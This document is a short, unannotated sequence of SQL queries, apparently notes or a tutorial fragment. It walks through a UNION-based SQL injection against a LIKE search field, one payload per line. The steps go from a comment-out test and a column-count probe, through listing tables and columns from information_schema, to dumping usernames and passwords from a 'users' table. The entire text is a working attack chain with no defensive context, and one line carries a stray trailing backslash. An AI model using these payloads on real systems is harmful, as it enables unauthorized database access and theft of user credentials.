SELECT (?, ?, ?) FROM ? WHERE ? LIKE '%val%';

SELECT (?, ?, ?) FROM ? WHERE ? LIKE '%';--%';

SELECT (?, ?, ?) FROM ? WHERE ? LIKE '%' UNION (SELECT 1, 2, 3 FROM dual);--%';

SELECT (?, ?, ?) FROM ? WHERE ? LIKE '%' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);--%';

SELECT (?, ?, ?) FROM ? WHERE ? LIKE '%' UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'users');--%';\

SELECT (?, ?, ?) FROM ? WHERE ? LIKE '%' UNION (SELECT username, password, first_name FROM users);--%';